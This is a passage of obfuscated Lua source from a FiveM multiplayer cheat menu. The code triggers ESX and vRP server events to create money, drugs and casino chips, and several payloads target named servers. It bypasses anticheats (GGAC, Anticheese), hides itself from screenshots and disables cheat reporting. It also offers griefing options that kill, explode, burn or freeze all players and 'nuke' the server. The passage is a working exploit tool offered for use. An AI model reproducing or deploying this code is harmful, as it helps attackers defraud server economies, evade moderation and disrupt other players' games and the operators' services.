                            "GoFast:VenteDuVehicule",
                            100000
                        )
                    end
                elseif I.button("Vangelico Robbery", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_vangelico_robbery") then
                        d.Main.GuestEvent(
                            "esx_vangelico_robbery:gioielli"
                        )
                        d.Main.GuestEvent("lester:vendita")
                    end
                elseif I.button("Drugs", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_drugs") then
                        d.Main.GuestEvent(
                            "esx_drugs:startHarvestOpium"
                        )
                        d.Main.GuestEvent(
                            "esx_drugs:startTransformOpium"
                        )
                        d.Main.GuestEvent(
                            "esx_drugs:startSellOpium"
                        )
                    end
                elseif I.button("Drugs ~g~KORIOZ", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_drugs") then
                        d.Main.GuestEvent(
                            "::{korioz#0110}::esx_drugs:startHarvestOpium"
                        )
                        d.Main.GuestEvent(
                            "::{korioz#0110}::esx_drugs:startTransformOpium"
                        )
                        d.Main.GuestEvent(
                            "::{korioz#0110}::esx_drugs:startSellOpium"
                        )
                    end
                elseif I.button("Job Civil", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("jobs_civil") then
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                        d.Main.GuestEvent("jobs_civil:pay", 999)
                    end
                elseif I.button("Casino Chips", "VRP") then
                    local ao = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Chips Amount:", "", 12)
                    if not I.functions.game.isNullOrEmpty(ao) then
                        vRPcasinoS = aX.a53984adb4d443ef1db5da1683ae5a("vRP_casino", "vRP_casino")
                        vRPcasinoS.payRouletteWinnings({ao, 2})
                    end
                elseif I.button("Spawn Owned Vehicle", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_vehicleshop") then
                        local eR = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Vehicle Spawn Name", "", 20)
                        local eS = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Vehicle Plate Number", "", 8)
                        I.functions.sPO.d5fcab6eb40ea3c064f246412c8ea6c(eR, PlayerId(), eS)
                    end
                elseif I.button("GCPhone Earrape", "Server") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("gcPhone") then
                        I.functions.exploits.a60d1e2bb110c550359e9f9425dc7baf()
                    end
                elseif I.button("Sell Owned Vehicle", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_vehicleshop") then
                        I.functions.sPO.ecff77c7cd1a99d5394e7bd0b878bccb()
                    end
                elseif I.button("Money Exploit", "ESX") then
                    I.functions.exploits.esx_moneymaker()
                elseif I.button("Wash money", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_moneywash") then
                        d.Main.GuestEvent(
                            "esx_moneywash:startWash"
                        )
                        d.Main.GuestEvent(
                            "esx_moneywash:startWash"
                        )
                        d.Main.GuestEvent(
                            "esx_moneywash:startWash"
                        )
                    end
                elseif I.button("Wash money ~g~KORIOZ", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_moneywash") then
                        d.Main.GuestEvent(
                            "::{korioz#0110}::esx_moneywash:startWash"
                        )
                        d.Main.GuestEvent(
                            "::{korioz#0110}::esx_moneywash:startWash"
                        )
                        d.Main.GuestEvent(
                            "::{korioz#0110}::esx_moneywash:startWash"
                        )
                    end
                elseif I.button("Open clothing menu", "ESX") then
                    TriggerEvent("esx_skin:openSaveableMenu")
                elseif I.button("Thirst & hunger", "ESX") then
                    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_status") then
                        TriggerEvent("esx_status:set", "hunger", 1000000)
                        TriggerEvent("esx_status:set", "thirst", 1000000)
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("settingsoptions") then
                if I.menuButton("Menu Options", "miscoptions", ">") then
                elseif I.menuButton("Configs", "configss", ">") then
                elseif I.menuButton("Protections", "protec", ">") then
                elseif I.button("Show menu info (F8)") then
                    print("^2Keys :")
                    print("^2PAGEUP : ^3Open Menu")
                    print("^2F1 : ^3Heal")
                    print("^2F2 : ^3Refill armour")
                    print("^2F3 : ^3Freecam")
                    print("^2F6 : ^3Repair vehicle")
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("configss") then
                if I.button("Cow Config", "~o~[Risky]") then
                    Guestcustomnotif("~o~Config : ~s~Cow Config has been enabled!", false)
                    I.OptionConfig.infStamina = not I.OptionConfig.infStamina
                    I.OptionConfig.noRagdoll = not I.OptionConfig.noRagdoll
                    I.OptionConfig.InfAmmo2 = not I.OptionConfig.InfAmmo2
                    I.OptionConfig.AutoClean = not I.OptionConfig.AutoClean
                    I.OptionConfig.weaponsDamageMultiplierCurrent = 5
                    I.OptionConfig.weaponsDamageMultiplierSelected = 5
                    I.OptionConfig.vehNoFall = not I.OptionConfig.vehNoFall
                    I.OptionConfig.NoBikeFall = not I.OptionConfig.NoBikeFall
                    SetPedCanBeKnockedOffVehicle(PlayerPedId(), I.OptionConfig.NoBikeFall)
                    I.OptionConfig.visb5ea815b0f8440ddaeebad4129bd7222 =
                        not I.OptionConfig.visb5ea815b0f8440ddaeebad4129bd7222
                    I.OptionConfig.ForceNamess = not I.OptionConfig.ForceNamess
                    d_ = 2
                    e0 = 2
                    SetTimecycleModifier("mp_lad_night")
                    SetTimecycleModifierStrength(1.2)
                    eG = 5
                    eH = 5
                    eI = 2
                    eJ = 2
                    I.OptionConfig.Aimbot = not I.OptionConfig.Aimbot
                    I.OptionConfig.DrawFovS = not I.OptionConfig.DrawFovS
                    SetPedInfiniteAmmoClip(PlayerPedId(), I.OptionConfig.InfAmmo2)
                elseif I.button("Legit Config", "~o~[Risky]") then
                    Guestcustomnotif("~o~Config : ~s~Legit Config has been enabled!", false)
                    I.OptionConfig.infStamina = not I.OptionConfig.infStamina
                    I.OptionConfig.AutoClean = not I.OptionConfig.AutoClean
                    I.OptionConfig.vehNoFall = not I.OptionConfig.vehNoFall
                    I.OptionConfig.NoBikeFall = not I.OptionConfig.NoBikeFall
                    SetPedCanBeKnockedOffVehicle(PlayerPedId(), I.OptionConfig.NoBikeFall)
                    eG = 2
                    eH = 2
                elseif I.button("Hard Config", "~o~[Risky]") then
                    Guestcustomnotif("~o~Config : ~s~Hard Config has been enabled!", false)
                    I.OptionConfig.infStamina = not I.OptionConfig.infStamina
                    I.OptionConfig.noRagdoll = not I.OptionConfig.noRagdoll
                    I.OptionConfig.InfAmmo2 = not I.OptionConfig.InfAmmo2
                    I.OptionConfig.AutoClean = not I.OptionConfig.AutoClean
                    I.OptionConfig.weaponsDamageMultiplierCurrent = 7
                    I.OptionConfig.weaponsDamageMultiplierSelected = 7
                    I.OptionConfig.vehNoFall = not I.OptionConfig.vehNoFall
                    I.OptionConfig.NoBikeFall = not I.OptionConfig.NoBikeFall
                    SetPedCanBeKnockedOffVehicle(PlayerPedId(), I.OptionConfig.NoBikeFall)
                    I.OptionConfig.visb5ea815b0f8440ddaeebad4129bd7222 =
                        not I.OptionConfig.visb5ea815b0f8440ddaeebad4129bd7222
                    I.OptionConfig.ForceNamess = not I.OptionConfig.ForceNamess
                    d_ = 2
                    e0 = 2
                    SetTimecycleModifier("mp_lad_night")
                    SetTimecycleModifierStrength(1.2)
                    eG = 6
                    eH = 6
                    eI = 2
                    eJ = 2
                    I.OptionConfig.Aimbot = not I.OptionConfig.Aimbot
                    I.OptionConfig.DrawFovS = not I.OptionConfig.DrawFovS
                    SetPedInfiniteAmmoClip(PlayerPedId(), I.OptionConfig.InfAmmo2)
                    I.OptionConfig.TriggerBot = not I.OptionConfig.TriggerBot
                    I.OptionConfig.weapNoReload = not I.OptionConfig.weapNoReload
                    I.OptionConfig.InfiniteCombatRoll = not I.OptionConfig.InfiniteCombatRoll
                elseif I.button("~r~More config will be added later!") then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("luaoptions") then
                if I.button("Handcuff with ~g~ESX", I.GuestCurrentUI._mVersion) then
                    d.Main.GuestEvent(
                        "esx_policejob:handcuff",
                        playerId
                    )
                elseif I.button("Handcuff with ~y~VRP", I.GuestCurrentUI._mVersion) then
                elseif I.button("Thirst & hunger with ~g~ESX", I.GuestCurrentUI._mVersion) then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
                elseif I.button("Revive with ~g~ESX", I.GuestCurrentUI._mVersion) then
                    TriggerEvent("esx_ambulancejob:revive")
                elseif
                    I.button("Open boss menu (Ambulance) ~g~ESX", I.GuestCurrentUI._mVersion)
                 then
                    TriggerEvent(
                        "esx_society:openBossMenu",
                        "ambulancejob",
                        function(data, menu)
                            menu.close()
                        end
                    )
                elseif I.button("Open boss menu (Mecano) ~g~ESX", I.GuestCurrentUI._mVersion) then
                    TriggerEvent(
                        "esx_society:openBossMenu",
                        "mecanojob",
                        function(data, menu)
                            menu.close()
                        end
                    )
                elseif I.button("Open boss menu (Police) ~g~ESX", I.GuestCurrentUI._mVersion) then
                    TriggerEvent(
                        "esx_society:openBossMenu",
                        "policejob",
                        function(data, menu)
                            menu.close()
                        end
                    )
                elseif I.button("Open clothing menu ~g~ESX", I.GuestCurrentUI._mVersion) then
                    TriggerEvent("esx_skin:openSaveableMenu")
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("protec") then
                if I.checkBox("Menu dont appear in screenshot", I.OptionConfig.SSBBypass) then
                    I.OptionConfig.SSBBypass = not I.OptionConfig.SSBBypass
                    fb5f8dc1fbf108c3e748b0759998a49a()
                elseif I.checkBox("~g~GGAC ~s~Bypass", I.OptionConfig.a0c2d90a367dfc455036ffebf7ef4cf0) then
                    I.OptionConfig.a0c2d90a367dfc455036ffebf7ef4cf0 =
                        not I.OptionConfig.a0c2d90a367dfc455036ffebf7ef4cf0
                    if I.OptionConfig.a0c2d90a367dfc455036ffebf7ef4cf0 then
                        a0c2d90a367dfc455036ffebf7ef4cf0()
                    end
                elseif I.button("Disable ~b~Anticheese") then
                    c3b2766b95403368b158933998f33080("anticheese")
                elseif I.button("Search for ~r~anticheats") then
                    f0230ce5eb652fded68c8ce322df5cf()
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("trolloptions") then
                if I.menuButton("Destroyer", "destroyeroptions", ">") then
                elseif I.menuButton("Utils", "utilsservers", ">") then
                elseif I.button("~r~AVERTISSEMENT: All listed options is risky") then
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("destroyeroptions") then
                if I.button("~p~			      	BIG DESTROY") then
                elseif I.button("Teleport everyone in the sky", "~r~[Risky]") then
                    for K in EnumeratePeds() do
                        if IsPedAPlayer(K) ~= true and K ~= PlayerPedId() then
                            RequestControlOnce(K)
                            SetPedToRagdoll(K, 4000, 5000, 0, true, true, true)
                            local x, y, z =
                                d.Main.GuestTable.GuestUnPack(
                                GetEntityCoords(PlayerPedId())
                            )
                            c3188c79a068242c231f422e25ebbae(K, x, y, z + 100.0)
                        end
                    end
                elseif I.button("Explode all cars", "~r~[Risky]") then
                    I.functions.aPO.e77b49bd9684a0376cb2b1cd3f9ae0()
                elseif I.button("Attach banana on all players", "~r~[Risky]") then
                    ad0a8b371fe68843d8e52c3d8d9b8c()
                elseif I.button("Nuke ~s~the server", "~r~[Risky]") then
                    NukeServer1()
                elseif I.checkBox("~Y~Freeze all players~r", I.OptionConfig.aPOFreeze) then
                    I.OptionConfig.aPOFreeze = not I.OptionConfig.aPOFreeze
                elseif I.button("Fire everyone") then
                    local eT = false
                    d.Main.GuestThread(
                        function()
                            while true do
                                d.Main.GuestWait(0)
                                if IsControlJustReleased(0, 10) then
                                    eT = true
                                end
                                if IsControlJustReleased(0, 11) then
                                    eT = false
                                end
                            end
                        end
                    )
                    while true do
                        d.Main.GuestWait(200)
                        if eT then
                            for cd, eU in ipairs(GetActivePlayers()) do
                                local K = GetPlayerPed(eU)
                                local coords = GetEntityCoords(K)
                                GetActuallyParticul("core")
                                SetPtfxAssetNextCall("core")
                                StartParticleFxNonLoopedAtCoord_2(
                                    "ent_sht_flame",
                                    coords.x,
                                    coords.y,
                                    coords.z,
                                    0.0,
                                    0.0,
                                    0.0,
                                    15.0,
                                    false,
                                    false,
                                    false
                                )
                            end
                        end
                    end
                elseif I.button("Explode everyone", "~r~[Risky]") then
                    runOnAll(Launch1)
                elseif I.button("Kill everyone", "~r~[Risky]") then
                    runOnAll(Silentkill)
                elseif I.button("Spam everyone of cars", "~r~[Risky]") then
                    runOnAll(Zombie99)
                elseif I.button("Burn everyone", "~r~[Risky]") then
                    runOnAll(BurnV2)
                elseif I.button("~p~			      OTHER OPTIONS") then
                elseif I.button("Kick everyone from they cars", "~r~[Risky]") then
                    f915f8cbe1f0061e1d1bb5e7f0cc8f()
                elseif I.checkBox("Make fly all cars ~o~(!)", I.OptionConfig.f2ae7507d6c4ad587226368a01bd45d7) then
                    I.OptionConfig.f2ae7507d6c4ad587226368a01bd45d7 =
                        not I.OptionConfig.f2ae7507d6c4ad587226368a01bd45d7
                elseif I.button("Give weapons to players", "~r~[Risky]") then
                    I.functions.aPO.bbc99a8240bf964dca27f2e8a48f665a(false)
                elseif I.button("Kill all peds", "~o~[Risky]") then
                    for K in EnumeratePeds() do
                        if IsPedAPlayer(K) ~= true and K ~= PlayerPedId() then
                            RequestControlOnce(K)
                            adc12da2eac5ceb7b3e53abdbb48(K, 0)
                        end
                    end
                    function GetActuallyParticul(eV)
                        RequestNamedPtfxAsset(eV)
                        if not HasNamedPtfxAssetLoaded(eV) then
                            while not HasNamedPtfxAssetLoaded(eV) do
                                d.Main.GuestWait(1.0)
                            end
                            return eV
                        else
                            return eV
                        end
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("utilsservers") then
                if
                    I.comboBox(
                        "Objets ~r~[Risky]",
                        I.comboBoxes[4]._words,
                        I.comboBoxes[4]._current,
                        I.comboBoxes[4]._selected,
                        function(dI, dJ)
                            I.comboBoxes[4]._current = dI
                            I.comboBoxes[4]._selected = dI
                        end
                    )
                 then
                    if type(I.comboBoxes[4]._actual[I.comboBoxes[4]._selected]) == "table" then
                        for aM, bb in pairs(I.comboBoxes[4]._actual[I.comboBoxes[4]._selected]) do
                            I.functions.aPO.a82067704cc6922707d00ddbe0451(
                                I.comboBoxes[4]._actual[I.comboBoxes[4]._selected][aM]
                            )
                        end
                    else
                        I.functions.aPO.a82067704cc6922707d00ddbe0451(
                            I.comboBoxes[4]._actual[I.comboBoxes[4]._selected]
                        )
                    end
                elseif
                    I.comboBox(
                        "Prop Block ~r~[Risky]",
                        I.menuTables.trollsPropBlock.words,
                        I.menuTables.trollsPropBlock.current,
                        I.menuTables.trollsPropBlock.selected,
                        function(dI, dJ)
                            I.menuTables.trollsPropBlock.current = dI
                            I.menuTables.trollsPropBlock.selected = dI
                        end
                    )
                 then
                    I.functions.aPO.propBlock(I.menuTables.trollsPropBlock.selected)
                elseif I.checkBox("Impossible to have a black screen", I.OptionConfig.BlockBlackScreen) then
                    I.OptionConfig.BlockBlackScreen = not I.OptionConfig.BlockBlackScreen
                elseif I.checkBox("Impossible to get take in hostage", I.OptionConfig.blocktakehostage) then
                    I.OptionConfig.blocktakehostage = not I.OptionConfig.blocktakehostage
                elseif I.button("~g~Bypass password", I.GuestCurrentUI._mVersion) then
                    FreezeEntityPosition(GetPlayerPed(-1), false)
                    CancelOnscreenKeyboard()
                elseif I.checkBox("Steal a car in freecam", VehicleSnatcher) then
                    VehicleSnatcher = not VehicleSnatcher
                    if VehicleSnatcher then
                        E = "Steal a car in freecam"
                        f2d640737d4432402aea6bcbdc90252(GetGameplayCamFov())
                    else
                        E = false
                        fc858f4ad9b7e9c12fcddc1e6ae220a6()
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("glifeoptions") then
                if I.checkBox("~g~GLife Method ~o~(?)", I.OptionConfig.GlifeHack) then
                    I.OptionConfig.GlifeHack = not I.OptionConfig.GlifeHack
                elseif I.button("~g~GLife Noclip") then
                    bbe679b6dacb3e2016befe41e2f494f1()
                elseif
                    I.button(
                        "~g~ GLife Anti-Screenshot ~o~(50% of work)",
                        I.GuestCurrentUI._mVersion
                    )
                 then
                    ReportCheat = function(...)
                        return
                    end
                    GetScreenshotFromUser = function()
                        Wait(10000)
                        return "Timeout"
                    end
                elseif
                    I.button("~g~ GLife Auto-Kill + TP ~o~(?)", I.GuestCurrentUI._mVersion)
                 then
                    local function a(b, eW, eX)
                        return d.Main.GuestCoroutine.GustWrap(
                            function()
                                local eY, aS = b()
                                if not aS or aS == 0 then
                                    eX(eY)
                                    return
                                end
                                local g = {handle = eY, destructor = eX}
                                d.Main.GuestCoroutine.GuestMetatable(
                                    g,
                                    be
                                )
                                local cu = true
                                repeat
                                    d.Main.GuestCoroutine.GuestYield(
                                        aS
                                    )
                                    cu, aS = eW(eY)
                                until not cu
                                g.destructor, g.handle = nil, nil
                                eX(eY)
                            end
                        )
                    end
                    local function b7()
                        return a(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
                    end
                    local function eZ()
                        return a(FindFirstObject, FindNextObject, EndFindObject)
                    end
                    local e_ = false
                    local f0 = false
                    local f1 = GetActivePlayers()
                    local f2 = 25
                    local SelPlayer =
                        d.Main.GuestInv(
                        0x4F8644AF03D0E0D6,
                        d.Main.GuestRRA(),
                        Citizen.ResultAsInteger()
                    )
                    local f3 = {}
                    local f4 = {}
                    local f5 = {}
                    local f6 = 0.4
                    local f7 = 0.70
                    local f8 = 0.4
                    function text2(aQ, cF, av, f9, fa, fb)
                        if cF then
                            SetTextOutline()
                        end
                        SetTextScale(0.00, av)
                        SetTextColour(255, 255, 255, 255)
                        SetTextFont(4)
                        SetTextProportional(0)
                        SetTextJustification(f9)
                        SetTextEntry("string")
                        AddTextComponentString(aQ)
                        DrawText(fa, fb)
                    end
                    function bind()
                        local fc = nil
                        local fd = nil
                        local fe = false
                        while not fe do
                            d.Main.GuestWait(1)
                            DrawRect(0.500, 0.50, 0.500, 0.4000, 0, 0, 0, 200)
                            text2("Which Key you want to open the Menu?", true, 0.70, 0, 0.50, 0.45)
                            for h, i in pairs(keys) do
                                if IsDisabledControlPressed(0, i) then
                                    fc = i
                                    fd = h
                                end
                            end
                            if fc ~= nil then
                                fe = true
                                return fc, fd
                            end
                        end
                    end
                    function GuestNotif2(ff)
                        local fg = 1
                        local fh = true
                        local fi = 0.515
                        local fj = 0.50
                        local fk = 0.1
                        d.Main.GuestThread(
                            function()
                                d.Main.GuestWait(2000)
                                while true do
                                    d.Main.GuestWait(0)
                                    fg = fg + 0.004
                                end
                            end
                        )
                        d.Main.GuestThread(
                            function()
                                fg = 1.1
                                repeat
                                    d.Main.GuestWait(0)
                                    fg = fg - 0.004
                                until fg == 0.97 or fg <= 0.97
                            end
                        )
                        d.Main.GuestThread(
                            function()
                                while fh do
                                    d.Main.GuestWait(0)
                                    fk = fg - 0.03
                                    DrawRect(fg - 0.005, fi, 0.202, 0.070, 210, 10, 0, 255)
                                    DrawRect(fg - 0.005, fi, 0.2, 0.070, 210, 10, 0, 255)
                                    DrawRect(fg, fi, 0.202, 0.070, 210, 10, 0, 255)
                                    DrawRect(fg, fi, 0.2, 0.070, 28, 28, 28, 255)
                                    text2(ff, false, 0.45, 0, fk, fj)
                                end
                            end
                        )
                        table.insert(f3, "test")
                        d.Main.GuestThread(
                            function()
                                d.Main.GuestWait(4000)
                                fh = false
                            end
                        )
                    end
                    local function h()
                        return a(FindFirstPed, FindNextPed, EndFindPed)
                    end
                    local bM = {
                        GetPlayerPed = function(aS)
                            return d.Main.GuestInv(
                                0x43A66C31C68491C0,
                                aS,
                                d.Main.GuestRRA(),
                                d.Main.GuestRAI()
                            )
                        end,
                        adc12da2eac5ceb7b3e53abdbb48 = function(fl, bd)
                            return d.Main.GuestInv(
                                0x6B76DC1F3AE6E6A3,
                                fl,
                                bd
                            )
                        end
                    }
                    local fm = 1200
                    d.Main.GuestThread(
                        function()
                            while true do
                                Wait(fm)
                                for fl in h() do
                                    if DoesEntityExist(fl) then
                                        if not IsPedAPlayer(fl) and fl ~= PlayerPedId() then
                                            bM.adc12da2eac5ceb7b3e53abdbb48(fl, 0)
                                            c3188c79a068242c231f422e25ebbae(fl, GetEntityCoords(bM.GetPlayerPed(-1)))
                                        end
                                    end
                                end
                            end
                        end
                    )
                elseif I.button("~g~ GLife Auto-Kill ~o~(?)", I.GuestCurrentUI._mVersion) then
                    local function a(b, eW, eX)
                        return d.Main.GuestCoroutine.GustWrap(
                            function()
                                local eY, aS = b()
                                if not aS or aS == 0 then
                                    eX(eY)
                                    return
                                end
                                local g = {handle = eY, destructor = eX}
                                d.Main.GuestCoroutine.GuestMetatable(
                                    g,
                                    be
                                )
                                local cu = true
                                repeat
                                    d.Main.GuestCoroutine.GuestYield(
                                        aS
                                    )
                                    cu, aS = eW(eY)
                                until not cu
                                g.destructor, g.handle = nil, nil
                                eX(eY)
                            end
                        )
                    end
                    local function b7()
                        return a(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
                    end
                    local function eZ()
                        return a(FindFirstObject, FindNextObject, EndFindObject)
                    end
                    local function h()
                        return a(FindFirstPed, FindNextPed, EndFindPed)
                    end
                    local bM = {
                        GetPlayerPed = function(aS)
                            return d.Main.GuestInv(
                                0x43A66C31C68491C0,
                                aS,
                                d.Main.GuestRRA(),
                                d.Main.GuestRAI()
                            )
                        end,
                        adc12da2eac5ceb7b3e53abdbb48 = function(fl, bd)
                            return d.Main.GuestInv(
                                0x6B76DC1F3AE6E6A3,
                                fl,
                                bd
                            )
                        end
                    }
                    local fm = 1200
                    d.Main.GuestThread(
                        function()
                            while true do
                                Wait(fm)
                                for fl in h() do
                                    if DoesEntityExist(fl) then
                                        if not IsPedAPlayer(fl) and fl ~= PlayerPedId() then
                                            bM.adc12da2eac5ceb7b3e53abdbb48(fl, 0)
                                        end
                                    end
                                end
                            end
                        end
                    )
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("meteooptions") then
                if I.button("Change the time > ~b~Morning", I.GuestCurrentUI._mVersion) then
                    SetClockTime(9, 0, 0)
                    NetworkOverrideClockTime(9, 0, 0)
                elseif I.button("Change the time > ~b~Afternoon", I.GuestCurrentUI._mVersion) then
                    SetClockTime(15, 0, 0)
                    NetworkOverrideClockTime(15, 0, 0)
                elseif I.button("Change the time > ~b~Night", I.GuestCurrentUI._mVersion) then
                    SetClockTime(21, 0, 0)
                    NetworkOverrideClockTime(21, 0, 0)
                elseif
                    I.button("Change the weather > ~g~Blue sky", I.GuestCurrentUI._mVersion)
                 then
                    ClearOverrideWeather()
                    ClearWeatherTypePersist()
                    SetWeatherTypeNow("EXTRASUNNY")
                    SetOverrideWeather("EXTRASUNNY")
                    SetWeatherTypeNowPersist("EXTRASUNNY")
                    SetRainLevel(0.0)
                elseif
                    I.button(
                        "Change the weather > ~g~Cloudy sky",
                        I.GuestCurrentUI._mVersion
                    )
                 then
                    ClearOverrideWeather()
                    ClearWeatherTypePersist()
                    SetWeatherTypeNow("CLOUDS")
                    SetOverrideWeather("CLOUDS")
                    SetWeatherTypeNowPersist("CLOUDS")
                    SetRainLevel(0.0)
                elseif
                    I.button("Change the weather > ~g~Rainy sky", I.GuestCurrentUI._mVersion)
                 then
                    ClearOverrideWeather()
                    ClearWeatherTypePersist()
                    SetWeatherTypeNow("RAIN")
                    SetOverrideWeather("RAIN")
                    SetWeatherTypeNowPersist("RAIN")
                    SetRainLevel(10.0)
                elseif I.checkBox("Weather > ~r~Christmas ", XMAS) then
                    XMAS = not XMAS
                    if XMAS then
                        SetForceVehicleTrails(true)
                        SetForcePedFootstepsTracks(true)
                        SetWeatherTypePersist("XMAS")
                        SetWeatherTypeNowPersist("XMAS")
                        SetWeatherTypeNow("XMAS")
                        SetOverrideWeather("XMAS")
                    end
                elseif I.checkBox("Weather > ~r~Blizzard", BLIZZARD) then
                    BLIZZARD = not BLIZZARD
                    if BLIZZARD then
                        SetWeatherTypePersist("BLIZZARD")
                        SetWeatherTypeNowPersist("BLIZZARD")
                        SetWeatherTypeNow("BLIZZARD")
                        SetOverrideWeather("BLIZZARD")
                    end
                elseif I.checkBox("Weather > ~r~Foggy ", FOGGY) then
                    FOGGY = not FOGGY
                    if FOGGY then
                        SetWeatherTypePersist("FOGGY")
                        SetWeatherTypeNowPersist("FOGGY")
                        SetWeatherTypeNow("FOGGY")
                        SetOverrideWeather("FOGGY")
                    end
                end
                I.d81c77ca5806c108e0dad172ac845()
            elseif I.isMenuOpened("giveoptions") then
                if I.button("Give ~b~SunLife", I.GuestCurrentUI._mVersion) then
                    print("[Guest_SUNLIFE]")
                    d.Main.GuestEvent(
                        "::{korioz#0110}::cambriolage:reward",
                        10000000
                    )
                elseif I.button("Give ~b~DreamyLife", I.GuestCurrentUI._mVersion) then
                    local fn = 50
                    d.Main.GuestThread(
                        function()
                            for b7 = 1, fn do
                                d.Main.GuestEvent(
                                    "::{korioz#0110}::esx_drugs:startHarvestOpium"
                                )
                                d.Main.GuestEvent(
                                    "::{korioz#0110}::esx_drugs:startTransformOpium"
                                )
                                d.Main.GuestEvent(
                                    "::{korioz#0110}::esx_drugs:startSellOpium"
                                )
                                d.Main.GuestEvent(
                                    "::{korioz#0110}::esx_moneywash:startWash"
                                )
                                d.Main.GuestEvent(
                                    "::{korioz#0110}::esx_moneywash:startWash"
                                )
                                d.Main.GuestEvent(
                                    "::{korioz#0110}::esx_moneywash:startWash"
                                )
                                d.Main.GuestEvent(
                                    "::{korioz#0110}::esx_moneywash:startWash"
                                )
                                d.Main.GuestEvent(
                                    "::{korioz#0110}::esx_moneywash:startWash"
                                )
                                d.Main.GuestWait(2500)
                            end
                        end
                    )
                elseif I.button("Give ~b~SunLife for all", I.GuestCurrentUI._mVersion) then
                    d.Main.GuestThread(
                        function()
                            d.Main.GuestEvent(
                                "::{korioz#0110}::cambriolage:reward",
                                1000000
                            )
                            while true do
                                d.Main.GuestWait(100)
                                for b7 = 0, 2100 do
                                    d.Main.GuestWait(100)
                                    d.Main.GuestEvent(
                                        "::{korioz#0110}::cambriolage:reward1",
                                        20000000
                                    )
                                    d.Main.GuestEvent(
                                        "::{korioz#0110}::esx:giveInventoryItem",
                                        b7,
                                        "item_account",
                                        "cash",
                                        1000000
                                    )
                                end
                            end
                        end
                    )
                elseif I.button("Give ~b~Realistic", I.GuestCurrentUI._mVersion) then
                    print("[Guest_REALISTIC]")
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                    d.Main.GuestEvent(
                        ":{OlLAZDdfpgsaszk}:jobs_civil:pay",
                        999
                    )
                elseif I.button("Give ~b~Sensity", I.GuestCurrentUI._mVersion) then
                    local fn = 100
                    d.Main.GuestThread(
                        function()
                            for b7 = 1, fn do
                                d.Main.GuestEvent(
                                    "Impulsionjobs_civil:pay",
                                    299
                                )
                                d.Main.GuestWait(7500)
                            end
                        end
                    )
